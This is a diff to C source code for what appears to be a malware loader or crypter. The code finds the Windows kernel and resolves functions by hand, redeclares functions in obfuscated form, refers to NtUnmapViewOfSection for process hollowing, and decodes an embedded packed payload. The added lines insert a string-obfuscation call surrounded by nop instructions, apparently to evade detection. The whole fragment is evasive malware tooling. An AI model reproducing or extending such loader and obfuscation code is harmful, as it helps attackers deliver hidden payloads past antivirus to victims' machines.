@@ -5,7 +5,7 @@ int extern conv7to8(unsigned char *indata, unsigned char *outdata, int lenarray)
 int extern startrand() asm ("_startrand") ; // (unsigned char *);
 int extern findkernel() asm ("_findkernel") ; // (unsigned char *);
 int extern getfunction( int kernel, unsigned char *library, int lenlib ) asm ("_getfunction");
-
+int extern ostring() asm ("_ostring") ; // (unsigned char *);
 
 // Redeclaration des type des fonctions offusquee 
 //http://undocumented.ntinternals.net/UserMode/Undocumented%20Functions/NT%20Objects/Section/NtUnmapViewOfSection.html
@@ -173,7 +173,11 @@ unsigned char* buffer;
 int payloadlen7;
 
 int main()
+
 {
+asm ( "nop" );
+int toto = ostring();
+asm ( "nop" );
 buffer = (unsigned char*) malloc (payloadlen);
 payloadlen7=conv7to8( payload,buffer,payloadlen);
 int dummy = vaauxfraises(41414141);
